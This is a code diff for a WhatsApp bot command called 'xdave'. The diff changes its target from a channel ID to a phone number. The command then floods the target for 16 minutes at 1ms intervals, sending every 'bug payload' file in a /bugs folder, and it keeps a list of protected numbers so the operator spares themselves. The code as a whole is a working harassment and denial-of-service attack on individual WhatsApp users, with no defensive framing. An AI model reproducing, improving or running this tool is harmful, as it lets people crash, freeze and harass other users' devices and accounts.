@@ -4,52 +4,38 @@ const fs = require('fs');
 const path = require('path');
 
 cmd({
-  pattern: 'xdave <channel id>',
-  desc: 'Flood bug payloads nan yon WhatsApp channel pou 16 minit',
+  pattern: 'xdave ?(.*)',
+  desc: 'Flood bug payloads to a number for 16 minutes',
   category: 'bug',
   react: '⚡',
   filename: __filename
-}, async (bot, mek, m, { from, reply }) => {
+}, async (bot, mek, { arg, reply, from }) => {
   try {
-    const prefix = config.PREFIX;
-
-    const body = m.body || '';
-    const cmdName = body.startsWith(prefix)
-      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
-      : '';
-    if (cmdName !== 'xdave') return;
-
-    const args = body.trim().split(/\s+/).slice(1);
-    const channelId = args[0]; // channel id (ex: 123456789-123456@g.us)
-
-    if (!channelId || !channelId.includes('@')) {
-      return await bot.sendMessage(from, {
-        text: `❌ Usage:\n${prefix}xdave <channel id>`
-      }, { quoted: mek });
+    const rawNumber = arg?.replace(/\D/g, '');
+    if (!rawNumber || rawNumber.length < 8) {
+      return await reply(`❌ Usage:\n.xdave <number>\nEx: .xdave 50942241547`);
     }
 
-    // Pwoteksyon pou kanal spesifik (si ou vle)
-    const protectedChannels = ['120363388484459995@g.us']; // mete channel id pwoteje isit
-    if (protectedChannels.includes(channelId)) {
-      return await bot.sendMessage(from, {
-        text: '🛡️ Channel sa a pwoteje. Komann an sispann.'
-      }, { quoted: mek });
+    const jid = rawNumber + '@s.whatsapp.net';
+
+    // Pwoteksyon si w pa vle atake tèt ou oswa lòt moun
+    const protectedNumbers = ['50938201920@s.whatsapp.net']; // ranplase ak numero ou
+    if (protectedNumbers.includes(jid)) {
+      return await reply('🛡️ Number sa a pwoteje. Operasyon an sispann.');
     }
 
     const bugsDir = path.join(__dirname, '../bugs');
     const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
 
     if (bugFiles.length === 0) {
-      return await bot.sendMessage(from, {
-        text: '📁 Pa gen payload nan folder /bugs.'
-      }, { quoted: mek });
+      return await reply('📁 Pa gen payload nan folder `/bugs`.');
     }
 
     await bot.sendMessage(from, {
-      text: `🚀 XDAVE flood kòmanse sou channel: ${channelId}\n🕒 Dire: 16 minit\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`
+      text: `🚀 *XDAVE flood started!*\n👤 Target: ${rawNumber}\n🕒 Duration: 16 minutes\n⚡ Delay: 1ms\n📦 Payloads: ${bugFiles.length}`
     }, { quoted: mek });
 
-    const endTime = Date.now() + (16 * 60 * 1000);
+    const endTime = Date.now() + (16 * 60 * 1000); // 16 min
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -59,24 +45,24 @@ cmd({
 
           if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
             const msg = bugPayload.default;
-            bugPayload = async (bot, channel) => {
-              await bot.sendMessage(channel, { text: msg });
+            bugPayload = async (bot, target) => {
+              await bot.sendMessage(target, { text: msg });
             };
           }
 
           if (typeof bugPayload === 'string') {
             const msg = bugPayload;
-            bugPayload = async (bot, channel) => {
-              await bot.sendMessage(channel, { text: msg });
+            bugPayload = async (bot, target) => {
+              await bot.sendMessage(target, { text: msg });
             };
           }
 
           if (typeof bugPayload === 'function') {
-            await bugPayload(bot, channelId);
+            await bugPayload(bot, jid);
           }
 
         } catch (e) {
-          console.error(`❌ Erè nan ${file}:`, e.message);
+          console.error(`❌ Error in ${file}:`, e.message);
         }
 
         await new Promise(res => setTimeout(res, 1)); // 1ms delay
@@ -84,11 +70,11 @@ cmd({
     }
 
     await bot.sendMessage(from, {
-      text: `✅ XDAVE flood fini sou channel: ${channelId}`
+      text: `✅ *XDAVE flood completed for:* ${rawNumber}`
     }, { quoted: mek });
 
   } catch (err) {
     console.error(err);
-    reply(`❌ Erè: ${err.message}`);
+    reply(`❌ Error: ${err.message}`);
   }
 });
